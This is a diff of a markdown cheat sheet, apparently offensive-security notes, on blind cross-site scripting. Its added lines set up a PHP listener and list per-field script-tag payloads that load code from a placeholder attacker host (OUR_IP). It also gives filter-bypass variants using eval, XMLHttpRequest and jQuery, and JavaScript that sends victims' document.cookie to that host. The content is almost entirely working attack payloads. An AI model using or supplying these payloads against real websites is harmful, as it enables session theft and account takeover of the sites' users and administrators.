@@ -2,39 +2,38 @@
 
 Blind XSS: vulnerability is triggered on a page we don't have access to.
 
-Remote Script:
-```html
-<script src="http://OUR_IP/script.js"></script>
+**Start a listener
+```
+mkdir /tmp/tmpserver
+cd /tmp/tmpserver
+sudo php -S 0.0.0.0:80
 ```
 
-Rename script.js to the input field so we can indicate which field is vulnerable. Try each field.
+Remote Scripts to test in each field:
+```html
+<script src="http://OUR_IP/name.js"></script>
+<script src="http://OUR_IP/email.js"></script>
+<script src="http://OUR_IP/phone.js"></script>
+<script src="http://OUR_IP/product.js"></script>
+<script src="http://OUR_IP/message.js"></script>
+```
+- Test for each field, including username, password, etc.
+- Listener will show which field is vulnerable
 
-<script src="http://OUR_IP/username.js"></script>
 
-<script src="http://OUR_IP/fullname.js"></script>
-
-etc. 
-
-Payloads:
+Payloads to test if above payload doesn't work:
 ```html
 <script src=http://OUR_IP></script>
-
 '><script src=http://OUR_IP></script>
-
 "><script src=http://OUR_IP></script>
-
 javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
-
 <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
-
 <script>$.getScript("http://OUR_IP")</script>
 ```
-
 
 Write to script.js on local machine (one or the other):
 ```javascript
 document.location='http://OUR_IP/index.php?c='+document.cookie;
-
 new Image().src='http://OUR_IP/index.php?c='+document.cookie;
 ```
 
